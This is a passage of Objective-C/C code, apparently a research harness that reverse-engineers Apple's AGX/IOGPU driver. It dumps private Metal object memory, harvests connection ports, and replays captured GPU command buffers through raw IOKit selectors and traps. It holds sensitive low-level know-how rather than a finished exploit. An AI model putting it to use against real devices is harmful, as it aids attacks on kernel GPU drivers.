    uint64_t sva = *(uint64_t *)((uint8_t *)storage + 0x68);   // segment list shmem VA
    id shmK = (__bridge id)(*(void **)((uint8_t *)storage + 0x20));
    id shmS = (__bridge id)(*(void **)((uint8_t *)storage + 0x60));
    uint32_t kid = shmK ? find_ivar_u32(shmK, "hmemID") : 0;
    uint32_t sid = shmS ? find_ivar_u32(shmS, "hmemID") : 0;
    // dump shmem-object and device-object ivars with values (hunt: io_connect_t)
    {
        id targets[2]; const char *tn[2];
        targets[0] = shmK; tn[0] = "shmK";
        targets[1] = (__bridge id)(*(void **)((uint8_t *)(__bridge void *)mq + 392)); tn[1] = "dev";   // _device
        for (int ti = 0; ti < 2; ti++) {
            if (!targets[ti]) continue;
            Class xc = object_getClass(targets[ti]);
            LOG("[mtls] %s class %s", tn[ti], class_getName(xc));
            while (xc) {
                unsigned ni = 0;
                Ivar *ivs = class_copyIvarList(xc, &ni);
                for (unsigned i = 0; i < ni; i++) {
                    const char *nm = ivar_getName(ivs[i]);
                    ptrdiff_t off = ivar_getOffset(ivs[i]);
                    uint64_t v = *(uint64_t *)((uint8_t *)(__bridge void *)targets[ti] + off);
                    LOG("[mtls]   %s ivar %s @%td = 0x%llx", tn[ti], nm ? nm : "?", off, v);
                }
                free(ivs);
                xc = class_getSuperclass(xc);
            }
        }
    }
    LOG("[mtls] storage: kcmdVA %llx (shmem id %u) seglistVA %llx (shmem id %u)",
        kva, kid, sva, sid);
    if (!kva || !sva) { LOG("[mtls] storage map mismatch, abort"); return; }
    mtl_hexdump("REF-kcmd", 0, (const uint8_t *)(uintptr_t)kva, 0x400);
    mtl_hexdump("REF-seg ", 0, (const uint8_t *)(uintptr_t)sva, 0x200);
    // diff vs our captured templates
    {
        long dk = 0, ds = 0; long fk[6] = {0,0,0,0,0,0}; int nf = 0;
        char fb[96] = "-";
        for (long o = 0; o < 0x400; o++)
            if (((uint8_t *)(uintptr_t)kva)[o] != agx_A4_image[o]) { dk++; if (nf < 6) fk[nf++] = o; }
        for (long o = 0; o < 0x200; o++)
            if (((uint8_t *)(uintptr_t)sva)[o] != agx_B4_image[o]) ds++;
        if (nf) {
            fb[0] = 0;
            for (int i = 0; i < nf; i++) { char t[14]; snprintf(t, sizeof t, "%s%lx", i ? "," : "", fk[i]); strlcat(fb, t, sizeof fb); }
        }
        LOG("[mtls] REF vs agx_A4_image: %ld/0x400 bytes differ (first at %s)", dk, fb);
        LOG("[mtls] REF vs agx_B4_image: %ld/0x200 bytes differ", ds);
    }

    // --- Metal commit (GPU sanity) — verify the copy actually lands
    LOG("[mtls] committing...");
    @try {
        [cb commit];
        LOG("[mtls] committed, waiting...");
        [cb waitUntilCompleted];
        LOG("[mtls] waitUntilCompleted returned");
    } @catch (NSException *e) {
        LOG("[mtls] EXCEPTION at commit/wait: %s %s", [[e name] UTF8String], [[e reason] UTF8String]);
        return;
    }
    long c41 = 0;
    LOG("[mtls] bufB contents ptr %p", [bufB contents]);
    uint8_t *bb = (uint8_t *)[bufB contents];
    for (long i = 0; i < 0x10000; i++) if (bb[i] == 0x41) c41++;
    LOG("[mtls] bufB scan done, 0x41 bytes %ld", c41);
    LOG("[mtls] cb status %ld", (long)[cb status]);
    NSError *cberr = [cb error];
    LOG("[mtls] cb error %@", cberr);
    LOG("[mtls] Metal commit: bufB 0x41 bytes %ld/0x10000 %s",
        c41, c41 ? "GPU WRITE OK (sanity)" : "NO WRITE?!");
    // re-dump reference shmems post-commit (kernel/finalize may patch them)
    mtl_hexdump("POST-kcmd", 0, (const uint8_t *)(uintptr_t)kva, 0x100);
    mtl_hexdump("POST-seg ", 0, (const uint8_t *)(uintptr_t)sva, 0x200);
    uint64_t mtlGpuA = [bufA gpuAddress];
    uint64_t mtlGpuB = [bufB gpuAddress];
    LOG("[mtls] Metal gpuAddress: bufA 0x%llx bufB 0x%llx", mtlGpuA, mtlGpuB);

    // --- raw replay of the reference bytes through OUR queue
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqVA = *(uint64_t *)out;
    uint32_t nqid = *(uint32_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    const char *pn = getprogname();
    strncpy((char *)in, pn, 0x1f);
    *(uint32_t *)(in + 0x400) = 2;
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    kern_return_t kb = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
    kern_return_t kn = IOConnectSetNotificationPort(c, 0, mach_reply_port(), nqid);
    LOG("[mtls] our queue: qid %llu nqid %u nqVA %llx bind 0x%08x notif 0x%08x",
        qid, nqid, nqVA, kb, kn);
    if (!qid || kb) return;
    uint8_t *vaSeg, *vaCmd;
    uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);
    uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);
    if (!idSeg || !idCmd) return;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    uint8_t *comp = must_map(0x1000);
    volatile uint8_t *nq = (volatile uint8_t *)(uintptr_t)nqVA;
    // our stand-in resources for the two Metal buffers
    uint64_t gpuvaA2 = 0, gpuvaB2 = 0;
    uint8_t *cpuA2 = NULL, *cpuB2 = NULL;
    uint32_t ridA2 = gpu_resource2(c, 0x10000, &gpuvaA2, &cpuA2);
    uint32_t ridB2 = gpu_resource2(c, 0x10000, &gpuvaB2, &cpuB2);
    if (cpuA2) memset(cpuA2, 0x41, 0x10000);
    if (cpuB2) memset(cpuB2, 0, 0x10000);
    LOG("[mtls] our resources: ridA %u gpuva %llx | ridB %u gpuva %llx",
        ridA2, gpuvaA2, ridB2, gpuvaB2);

    // Raw-replay variants of the reference (post-commit) bytes:
    //  R1: verbatim; R2: count-2 6-pack group rids -> ours + bufA/bufB GPUVAs -> ours;
    //  R3: R2 + recreate EVERY group's resources (matching sizeKB) and patch all rids.
    for (int var = 1; var <= 3; var++) {
        memcpy(vaCmd, (void *)(uintptr_t)kva, 0x4000);
        memcpy(vaSeg, (void *)(uintptr_t)sva, 0x4000);
        int nextra = 0;
        if (var >= 2) {
            for (long o = 0x48; o + 0x40 <= 0x1000; o += 0x40) {
                if (*(uint16_t *)(vaSeg + o + 0x3e) == 2 &&
                    *(uint32_t *)(vaSeg + o + 0x18) == 0x40 &&
                    *(uint32_t *)(vaSeg + o + 0x1c) == 0x40) {
                    *(uint32_t *)(vaSeg + o + 0x00) = ridA2;
                    *(uint32_t *)(vaSeg + o + 0x04) = ridB2;
                    LOG("[mtls] R%d: count-2 group @%lx rids -> %u,%u", var, o, ridA2, ridB2);
                }
            }
            for (long o = 0; o < 0x4000 - 8; o += 4) {
                uint64_t q = *(uint64_t *)(vaCmd + o);
                if (q == mtlGpuA) *(uint64_t *)(vaCmd + o) = gpuvaA2;
                else if (q == mtlGpuB) *(uint64_t *)(vaCmd + o) = gpuvaB2;
                q = *(uint64_t *)(vaSeg + o);
                if (q == mtlGpuA) *(uint64_t *)(vaSeg + o) = gpuvaA2;
                else if (q == mtlGpuB) *(uint64_t *)(vaSeg + o) = gpuvaB2;
            }
        }
        if (var >= 3) {
            // recreate every 6-pack group's resources with matching sizes
            for (long o = 0x48; o + 0x40 <= 0x1000; o += 0x40) {
                uint16_t cnt = *(uint16_t *)(vaSeg + o + 0x3e);
                if (cnt < 1 || cnt > 6) break;
                for (int i = 0; i < cnt; i++) {
                    uint32_t kb = *(uint32_t *)(vaSeg + o + 0x18 + i * 4);
                    uint64_t sz = (uint64_t)(kb ? kb : 4) << 10;
                    // keep our two buffer rids in the count-2 group
                    if (cnt == 2 && kb == 0x40 && i == 0 &&
                        *(uint32_t *)(vaSeg + o + 0x00) == ridA2) { nextra++; continue; }
                    if (cnt == 2 && kb == 0x40 && i == 1 &&
                        *(uint32_t *)(vaSeg + o + 0x04) == ridB2) { nextra++; continue; }
                    uint64_t g2 = 0; uint8_t *c2 = NULL;
                    uint32_t r2 = gpu_resource2(c, sz, &g2, &c2);
                    if (r2 && c2) memset(c2, 0, sz > 0x10000 ? 0x10000 : sz);
                    *(uint32_t *)(vaSeg + o + i * 4) = r2;
                    nextra++;
                }
            }
            LOG("[mtls] R3: recreated/patched %d resource slots", nextra);
        }
        memset(comp, 0, 0x1000);
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = idCmd;
        *(uint32_t *)(entry + 0x04) = idSeg;
        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
        *outw = 0xdeadbeef;
        if (cpuB2) memset(cpuB2, 0, 0x10000);
        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        usleep(50000);
        uint32_t wr = nqVA ? *(volatile uint32_t *)(nq + 0x08) : 0;
        uint32_t s1 = 0xffff, s2 = 0xffff;
        if (nqVA && wr >= 0x2c) {
            s2 = *(volatile uint32_t *)(nq + 0x10 + wr - 0x2c + 0x18);
            if (wr >= 0x58) s1 = *(volatile uint32_t *)(nq + 0x10 + wr - 0x58 + 0x18);
        }
        long b41 = 0, bnz = 0;
        if (cpuB2) for (long i = 0; i < 0x10000; i++) { if (cpuB2[i]) bnz++; if (cpuB2[i] == 0x41) b41++; }
        LOG("[mtls] R%d -> kr 0x%08x outU32 %08x wrIdx %x statuses {%u, %u} | ourB nz %ld 0x41 %ld %s%s",
            var, kt, *outw, wr, s1, s2, bnz, b41,
            (s1 == 0 && s2 == 0) ? "ACCEPTED" : "",
            b41 ? " *** GPU WRITE INTO OUR BUFFER ***" : "");
    }
    // R5: queue-create blob variants on OUR connection — does any variant get
    // past execution-stage status 5? Same captured-fill config throughout.
    {
        const char *fullpath = [[[NSBundle mainBundle] executablePath] UTF8String];
        static const struct { int nameMode; uint32_t prio; int fast; const char *n; } qv[] = {
            { 0, 0, 0, "zero-blob" },
            { 1, 2, 0, "name+prio2" },
            { 2, 2, 0, "path+prio2" },
            { 2, 0, 0, "path+prio0" },
            { 2, 2, 1, "path+prio2+fast" },
        };
        // build the fill config once (verbatim template, capture GPUVAs match)
        memcpy(vaCmd, agx_A4_image, 0x4000);
        if (gpuvaB2 != 0x10000018000ULL) {
            for (long o = 0; o < 0x1000 - 8; o += 4) {
                uint64_t q = *(uint64_t *)(vaCmd + o);
                if ((q >> 32) == 0x100) {
                    if ((q & 0xffffffff) == 0x18000) *(uint64_t *)(vaCmd + o) = gpuvaB2;
                    else *(uint64_t *)(vaCmd + o) = gpuvaA2 + (q & 0x3fff);
                }
            }
        }
        memcpy(vaSeg, agx_B4_image, 0x4000);
        *(uint32_t *)(vaSeg + 0x40) = 2;
        *(uint32_t *)(vaSeg + 0x44) = 1;
        uint8_t *g6 = vaSeg + 0x48;
        memset(g6, 0, 0x40);
        *(uint32_t *)(g6 + 0x00) = ridA2;
        *(uint32_t *)(g6 + 0x04) = ridB2;
        *(uint32_t *)(g6 + 0x18) = 0x40;
        *(uint32_t *)(g6 + 0x1c) = 0x40;
        *(uint16_t *)(g6 + 0x30) = 3;
        *(uint16_t *)(g6 + 0x32) = 3;
        *(uint16_t *)(g6 + 0x3e) = 2;
        for (unsigned v = 0; v < sizeof(qv)/sizeof(qv[0]); v++) {
            uint8_t *o5 = must_map(0x1000);
            memset(o5, 0, 0x1000);
            uint64_t a14b[2] = { 0x100, 0x10 };
            size_t oz5 = 0x10;
            uint64_t oc5[4] = {0,0,0,0}; uint32_t noc5 = 0;
            kern_return_t knq = IOConnectCallMethod(c, 14, a14b, 2, NULL, 0, oc5, &noc5, o5, &oz5);
            uint64_t nqVA2 = *(uint64_t *)o5;
            uint32_t nqid2 = *(uint32_t *)(o5 + 8);
            memset(in, 0, 0x2000);
            memset(o5, 0, 0x1000);
            if (qv[v].nameMode == 1) strncpy((char *)in, pn, 0x1f);
            if (qv[v].nameMode == 2) strncpy((char *)in, fullpath, 0x3f);
            *(uint32_t *)(in + 0x400) = qv[v].prio;
            if (qv[v].fast) in[0x405] = 1;
            oz5 = 0x10; noc5 = 0;
            kern_return_t kq = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, oc5, &noc5, o5, &oz5);
            uint64_t qid2 = *(uint64_t *)o5;
            uint64_t a24b[2] = { qid2, nqid2 };
            kern_return_t kb2 = IOConnectCallScalarMethod(c, 24, a24b, 2, NULL, NULL);
            vm_deallocate(mach_task_self(), (vm_address_t)o5, 0x1000);
            if (knq || kq || !qid2 || kb2) {
                LOG("[mtls] R5 %s: setup fail (nq 0x%08x q 0x%08x bind 0x%08x)", qv[v].n, knq, kq, kb2);
                continue;
            }
            memset(entry, 0, 0x1000);
            *(uint32_t *)(entry + 0x00) = idCmd;
            *(uint32_t *)(entry + 0x04) = idSeg;
            *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
            *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
            *outw = 0xdeadbeef;
            if (cpuB2) memset(cpuB2, 0, 0x10000);
            kern_return_t kt5 = ioconnect_trap4(c, 0, qid2, 0x40, (uintptr_t)entry, (uintptr_t)outw);
            usleep(50000);
            uint32_t wr = nqVA2 ? *(volatile uint32_t *)((volatile uint8_t *)(uintptr_t)nqVA2 + 0x08) : 0;
            uint32_t s1 = 0xffff, s2 = 0xffff;
            volatile uint8_t *nq2 = (volatile uint8_t *)(uintptr_t)nqVA2;
            if (nqVA2 && wr >= 0x2c) {
                s2 = *(volatile uint32_t *)(nq2 + 0x10 + wr - 0x2c + 0x18);
                if (wr >= 0x58) s1 = *(volatile uint32_t *)(nq2 + 0x10 + wr - 0x58 + 0x18);
            }
            long b5 = 0, bnz = 0;
            if (cpuB2) for (long i = 0; i < 0x10000; i += 0x10) { if (cpuB2[i]) bnz++; if (cpuB2[i] == 0x5A) b5++; }
            LOG("[mtls] R5 %-16s -> kr 0x%08x outU32 %08x statuses {%u, %u} | B nz %ld 5A %ld %s",
                qv[v].n, kt5, *outw, s1, s2, bnz, b5, b5 ? "*** GPU WRITE ***" : "");
        }
    }
    if (nqVA) mtl_hexdump("nq ", 0, (const uint8_t *)nq, 0x100);

    // R4: find Metal's real command connection (raw-dump IOGPUDevice /
    // _deviceRef / _impl, harvest port-like u32s, probe each with harmless
    // shmem-create in both numberings), then submit our captured fill through
    // Metal's queue (qid from cqobj+0x18).
    {
        uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
        uint8_t *cqo = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 384);
        uint64_t mqid = cqo ? *(uint64_t *)(cqo + 0x18) : 1;
        if (!mqid || mqid > 0x1000) mqid = 1;
        uint8_t *objs[6];
        objs[0] = shmK ? *(uint8_t **)((uint8_t *)(__bridge void *)shmK + 120) : NULL;  // IOGPUDevice
        objs[1] = devObj ? *(uint8_t **)(devObj + 656) : NULL;   // _deviceRef
        objs[2] = devObj ? *(uint8_t **)(devObj + 872) : NULL;   // _impl
        objs[3] = shmK ? *(uint8_t **)((uint8_t *)(__bridge void *)shmK + 8) : NULL;    // shmem _priv
        objs[4] = devObj ? *(uint8_t **)(devObj + 672) : NULL;   // _storageCreateParams
        objs[5] = cqo;                                           // command queue CF obj
        uint32_t accel = devObj ? *(uint32_t *)(devObj + 664) : 0;  // _acceleratorPort
        uint32_t cand[64]; int ncand = 0;
        if (accel) cand[ncand++] = accel;
        for (int oi = 0; oi < 6; oi++) {
            if (!objs[oi]) continue;
            for (long off = 0; off < 0x200; off += 4) {
                uint32_t v = *(uint32_t *)(objs[oi] + off);
                if (v > 0x1000 && v < 0x100000 && (v & 3) == 3) {
                    int dup = 0;
                    for (int k = 0; k < ncand; k++) if (cand[k] == v) dup = 1;
                    if (!dup && ncand < 56) { cand[ncand++] = v; LOG("[mtls] R4: obj%d +%lx port-like 0x%x", oi, off, v); }
                }
            }
        }
        // direct opens: Metal-grade userclient candidates
        static const char *svcNames[] = { "AGXAcceleratorG16P", "AGXAcceleratorG16", "AGXAccelerator", "IOGPU" };
        static const uint32_t svcTypes[] = { 0x100005, 5, 1, 0 };
        for (unsigned sn = 0; sn < sizeof(svcNames)/sizeof(svcNames[0]); sn++) {
            for (unsigned st = 0; st < sizeof(svcTypes)/sizeof(svcTypes[0]); st++) {
                io_connect_t cc = open_service(svcNames[sn], svcTypes[st]);
                if (cc) {
                    LOG("[mtls] R4: open %s type 0x%x -> conn 0x%x", svcNames[sn], svcTypes[st], cc);
                    if (ncand < 60) cand[ncand++] = cc;
                }
            }
        }
        LOG("[mtls] R4: %d candidate ports, qid-cand %llu", ncand, mqid);
        io_connect_t mconn = 0;
        int useSelRes = 8, useSelShm = 12;
        for (int k = 0; k < ncand && !mconn; k++) {
            uint8_t *o12 = must_map(0x1000);
            memset(o12, 0, 0x1000);
            uint64_t a2[2] = { 0x1000, 0 };
            size_t oz = 0x10;
            uint64_t oc[4] = {0,0,0,0}; uint32_t noc = 0;
            kern_return_t k12 = IOConnectCallMethod(cand[k], 12, a2, 2, NULL, 0, oc, &noc, o12, &oz);
            if (k12 == 0) { mconn = cand[k]; useSelRes = 8; useSelShm = 12; }
            else {
                memset(o12, 0, 0x1000); oz = 0x10; noc = 0;
                kern_return_t k14 = IOConnectCallMethod(cand[k], 14, a2, 2, NULL, 0, oc, &noc, o12, &oz);
                LOG("[mtls] R4: port 0x%x sel12 0x%08x sel14 0x%08x", cand[k], k12, k14);
                if (k14 == 0) { mconn = cand[k]; useSelRes = 9; useSelShm = 14; }
            }
            vm_deallocate(mach_task_self(), (vm_address_t)o12, 0x1000);
            if (mconn) LOG("[mtls] R4: Metal command conn = 0x%x (res sel %d, shmem sel %d)",
                           mconn, useSelRes, useSelShm);
        }
        if (mconn) {
            const uint64_t BSZ4 = 0x10000;
            uint64_t gA = 0, gB = 0;
            uint8_t *cA = NULL, *cB = NULL;
            uint32_t rA = gpu_resource2(mconn, BSZ4, &gA, &cA);   // tries sel 8 then 9
            uint32_t rB = gpu_resource2(mconn, BSZ4, &gB, &cB);
            uint8_t *vS = NULL, *vC = NULL;
            uint32_t iS = 0, iC = 0;
            if (useSelShm == 12) {
                iS = gpu_shmem_t(mconn, 0x4000, 0, &vS);
                iC = gpu_shmem_t(mconn, 0x4000, 1, &vC);
            } else {
                // macOS numbering: sel 14 {size, type}, out {VA, ?, size, id@hi dword of q1}
                for (int ty = 0; ty < 2; ty++) {
                    uint8_t *o14 = must_map(0x1000);
                    memset(o14, 0, 0x1000);
                    uint64_t a2[2] = { 0x4000, (uint64_t)ty };
                    size_t oz = 0x20;
                    uint64_t oc[4] = {0,0,0,0}; uint32_t noc = 0;
                    kern_return_t k14 = IOConnectCallMethod(mconn, 14, a2, 2, NULL, 0, oc, &noc, o14, &oz);
                    uint64_t va = *(uint64_t *)o14;
                    uint32_t id = (uint32_t)(*(uint64_t *)(o14 + 8) >> 32);
                    LOG("[mtls] R4: sel14 type %d -> kr 0x%08x va %llx id %u", ty, k14, va, id);
                    if (k14 == 0) {
                        if (ty == 0) { iS = id; vS = (uint8_t *)(uintptr_t)va; }
                        else { iC = id; vC = (uint8_t *)(uintptr_t)va; }
                    }
                    vm_deallocate(mach_task_self(), (vm_address_t)o14, 0x1000);
                }
            }
            LOG("[mtls] R4: resA rid %u gpuva %llx | resB rid %u gpuva %llx | shmem %u/%u",
                rA, gA, rB, gB, iS, iC);
            if (rA && rB && cA && cB && iS && iC) {
                memset(cA, 0x41, BSZ4);
                memset(cB, 0, BSZ4);
                memcpy(vC, agx_A4_image, 0x4000);   // captured fill (writes 0x5A)
                for (long o = 0; o < 0x1000 - 8; o += 4) {
                    uint64_t q = *(uint64_t *)(vC + o);
                    if ((q >> 32) == 0x100) {
                        if ((q & 0xffffffff) == 0x18000) *(uint64_t *)(vC + o) = gB;
                        else *(uint64_t *)(vC + o) = gA + (q & 0x3fff);
                    }
                }
                memcpy(vS, agx_B4_image, 0x4000);
                *(uint32_t *)(vS + 0x40) = 2;       // numResources
                *(uint32_t *)(vS + 0x44) = 1;       // numResourceGroups
                uint8_t *g6 = vS + 0x48;
                memset(g6, 0, 0x40);
                *(uint32_t *)(g6 + 0x00) = rA;
                *(uint32_t *)(g6 + 0x04) = rB;
                *(uint32_t *)(g6 + 0x18) = (uint32_t)(BSZ4 >> 10);
                *(uint32_t *)(g6 + 0x1c) = (uint32_t)(BSZ4 >> 10);
                *(uint16_t *)(g6 + 0x30) = 3;
                *(uint16_t *)(g6 + 0x32) = 3;
                *(uint16_t *)(g6 + 0x3e) = 2;
                memset(entry, 0, 0x1000);
                *(uint32_t *)(entry + 0x00) = iC;
                *(uint32_t *)(entry + 0x04) = iS;
                *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
                *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
                *outw = 0xdeadbeef;
                LOG("[mtls] R4 submitting via Metal conn 0x%x qid %llu...", mconn, mqid);
                kern_return_t k4 = ioconnect_trap4(mconn, 0, mqid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
                LOG("[mtls] R4 trap returned kr 0x%08x outU32 %08x", k4, *outw);
                usleep(5000);
                long q5 = 0, qnz = 0;
                for (long i = 0; i < (long)BSZ4; i += 0x10) { if (cB[i]) qnz++; if (cB[i] == 0x5A) q5++; }
                LOG("[mtls] R4 EARLY resB(sampled) nz %ld 5A %ld | [0..15] %02x %02x %02x %02x %02x %02x %02x %02x",
                    qnz, q5, cB[0], cB[1], cB[2], cB[3], cB[4], cB[5], cB[6], cB[7]);
                usleep(300000);
                LOG("[mtls] R4 post-wait alive");
                long f5 = 0, bnz = 0;
                for (long i = 0; i < (long)BSZ4; i++) { if (cB[i]) bnz++; if (cB[i] == 0x5A) f5++; }
                LOG("[mtls] R4 Metal-queue submit -> kr 0x%08x outU32 %08x | resB nz %ld 0x5A %ld %s",
                    k4, *outw, bnz, f5, f5 ? "*** GPU WRITE VIA METAL QUEUE ***" : "");
                LOG("[mtls] R4 resB[0..15] %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                    cB[0], cB[1], cB[2], cB[3], cB[4], cB[5], cB[6], cB[7],
                    cB[8], cB[9], cB[10], cB[11], cB[12], cB[13], cB[14], cB[15]);
            }
        }
    }
    IOServiceClose(c);
    LOG("[mtls] done (alive)");
}

// V87: connection / userclient-type probe. Why does our IOGPU type-1 queue get
// a no-op GPU context ({0,0}, no write) while Metal's queue really executes?
// 1) identify Metal's conn class/registry path; 2) registry scan of IOGPU/AGX
// services; 3) userclient type sweep with a one-shot replay submit per type.
static void connprobe_submittest(io_connect_t c, const char *tag) {
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqVA = *(uint64_t *)out;
    uint32_t nqid = *(uint32_t *)(out + 8);
    if (kr) { LOG("[connp] %s: sel14 kr 0x%08x", tag, kr); return; }
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    const char *pn = getprogname();
    strncpy((char *)in, pn, 0x1f);
    *(uint32_t *)(in + 0x400) = 2;
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    kern_return_t kb = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
    if (kr || !qid || kb) { LOG("[connp] %s: queue kr 0x%08x qid %llu bind 0x%08x", tag, kr, qid, kb); return; }
    uint64_t gA = 0, gB = 0;
    uint8_t *cA = NULL, *cB = NULL;
    uint32_t rA = gpu_resource2(c, 0x10000, &gA, &cA);
    uint32_t rB = gpu_resource2(c, 0x10000, &gB, &cB);
    uint8_t *vS = NULL, *vC = NULL;
    uint32_t iS = gpu_shmem_t(c, 0x4000, 0, &vS);
    uint32_t iC = gpu_shmem_t(c, 0x4000, 1, &vC);
    if (!rA || !rB || !cA || !cB || !iS || !iC) {
        LOG("[connp] %s: res/shmem fail rA %u rB %u iS %u iC %u", tag, rA, rB, iS, iC);
        return;
    }
    memset(cA, 0x41, 0x10000);
    memset(cB, 0, 0x10000);
    memcpy(vC, agx_A4_image, 0x4000);
    if (gB != 0x10000018000ULL) {
        for (long o = 0; o < 0x1000 - 8; o += 4) {
            uint64_t q = *(uint64_t *)(vC + o);
            if ((q >> 32) == 0x100) {
                if ((q & 0xffffffff) == 0x18000) *(uint64_t *)(vC + o) = gB;
                else *(uint64_t *)(vC + o) = gA + (q & 0x3fff);
            }
        }
    }
    memcpy(vS, agx_B4_image, 0x4000);
    *(uint32_t *)(vS + 0x40) = 2;
    *(uint32_t *)(vS + 0x44) = 1;
    uint8_t *g6 = vS + 0x48;
    memset(g6, 0, 0x40);
    *(uint32_t *)(g6 + 0x00) = rA;
    *(uint32_t *)(g6 + 0x04) = rB;
    *(uint32_t *)(g6 + 0x18) = 0x40;
    *(uint32_t *)(g6 + 0x1c) = 0x40;
    *(uint16_t *)(g6 + 0x30) = 3;
    *(uint16_t *)(g6 + 0x32) = 3;
    *(uint16_t *)(g6 + 0x3e) = 2;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    uint8_t *comp = must_map(0x1000);
    memset(comp, 0, 0x1000);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = iC;
    *(uint32_t *)(entry + 0x04) = iS;
    *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
    *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
    *outw = 0xdeadbeef;
    LOG("[connp] %s: submitting (qid %llu, rA %u rB %u)...", tag, qid, rA, rB);
    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
    usleep(50000);
    uint32_t wr = nqVA ? *(volatile uint32_t *)((volatile uint8_t *)(uintptr_t)nqVA + 0x08) : 0;
    uint32_t s1 = 0xffff, s2 = 0xffff;
    volatile uint8_t *nq2 = (volatile uint8_t *)(uintptr_t)nqVA;
    if (nqVA && wr >= 0x2c) {
        s2 = *(volatile uint32_t *)(nq2 + 0x10 + wr - 0x2c + 0x18);
        if (wr >= 0x58) s1 = *(volatile uint32_t *)(nq2 + 0x10 + wr - 0x58 + 0x18);
    }
    long b5 = 0, bnz = 0;
    for (long i = 0; i < 0x10000; i++) { if (cB[i]) bnz++; if (cB[i] == 0x5A) b5++; }
    LOG("[connp] %s -> kr 0x%08x outU32 %08x wrIdx %x statuses {%u, %u} | B nz %ld 5A %ld %s",
        tag, kt, *outw, wr, s1, s2, bnz, b5, b5 ? "*** GPU WRITE ***" : "");
}

static void p_connprobe(void) {
    LOG("[connp] v87: connection/type probe");
    // 1. identify Metal's command connection class + registry path
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    id<MTLCommandQueue> mq = dev ? [dev newCommandQueue] : nil;
    if (mq) {
        uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
        uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
        io_connect_t mc = dref ? *(uint32_t *)(dref + 0x14) : 0;
        io_name_t nm; char path[1024];
        if (mc) {
            kern_return_t k1 = IOObjectGetClass(mc, nm);
            path[0] = 0;
            kern_return_t k2 = IORegistryEntryGetPath(mc, kIOServicePlane, path);
            LOG("[connp] Metal conn 0x%x: class '%s' (kr %x) path '%s' (kr %x)",
                mc, k1 ? "?" : nm, k1, k2 ? "?" : path, k2);
        }
        io_connect_t ours = open_service("IOGPU", 1);
        if (ours) {
            kern_return_t k1 = IOObjectGetClass(ours, nm);
            path[0] = 0;
            kern_return_t k2 = IORegistryEntryGetPath(ours, kIOServicePlane, path);
            LOG("[connp] our type1 conn 0x%x: class '%s' (kr %x) path '%s' (kr %x)",
                ours, k1 ? "?" : nm, k1, k2 ? "?" : path, k2);
            IOServiceClose(ours);
        }
    }
    // 2. registry scan
    static const char *cls[] = { "IOGPU", "IOGPUDevice", "AGXAccelerator",
                                 "AGXAcceleratorG16P", "AGXAcceleratorG16", "AGXDevice", NULL };
    for (int ci = 0; cls[ci]; ci++) {
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching(cls[ci]), &it) || !it) {
            LOG("[connp] match %s: none", cls[ci]);
            continue;
        }
        io_registry_entry_t e; int n = 0;
        while ((e = IOIteratorNext(it)) && n < 6) {
            io_name_t nm2, cl2; char path[1024];
            IORegistryEntryGetName(e, nm2);
            IOObjectGetClass(e, cl2);
            path[0] = 0;
            IORegistryEntryGetPath(e, kIOServicePlane, path);
            LOG("[connp] match %-20s: name '%s' class '%s' path '%s'", cls[ci], nm2, cl2, path);
            IOObjectRelease(e); n++;
        }
        IOObjectRelease(it);
    }
    // 3. userclient type sweep with one-shot replay submit per openable type
    static const char *sweepSvcs[] = { "IOGPU", "AGXAcceleratorG16P" };
